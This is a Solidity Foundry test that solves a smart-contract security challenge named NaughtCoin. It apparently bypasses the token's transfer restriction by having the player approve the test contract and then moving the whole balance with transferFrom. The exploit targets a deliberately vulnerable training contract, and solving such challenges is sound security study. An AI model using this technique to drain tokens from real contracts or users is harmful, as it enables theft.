// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/15-NaughtCoin.sol";
import "../contracts/15-NaughtCoinFactory.sol";
import "../lib/forge-std/src/console2.sol";

contract NaughtCoinTest is Test {
    NaughtCoinFactory public factoryContract;
    address public eoa;
    address public challengeAddress;

    function createUsers(uint256 userNum) internal returns (address[] memory) {
        address[] memory users = new address[](userNum);
        for (uint256 i = 0; i < userNum; i++) {
            // Compute the address from the given priv key
            address user = vm.addr(uint256(keccak256(abi.encodePacked(i))));

            // Fund user with 100 Eth
            vm.deal(user, 100);
            users[i] = user;
        }
        return users;
    }

    function setUp() public {
        // Create EOA and take the 0th (1st) element from the returned array
        eoa = createUsers(1)[0];

        // Deploy factory to create challenge instance
        factoryContract = new NaughtCoinFactory();
        challengeAddress = factoryContract.createInstance(eoa);
    }

    function afterRun() public view returns (bool) {
        return factoryContract.validateInstance(payable(address(challengeAddress)), eoa);
    }

    function testCheck() public {

        NaughtCoin challengeContract = NaughtCoin(address(challengeAddress));

        // approve testContract to spend players balance
        vm.startPrank(eoa, eoa);
        uint256 playerBalance = challengeContract.balanceOf(eoa);
        challengeContract.approve(address(this), playerBalance);

        // testContract transfers players balance to itself
        vm.stopPrank();
        challengeContract.transferFrom(eoa, address(this), playerBalance);

        assertEq(afterRun(), true, "Challenge not solved");
    }
}
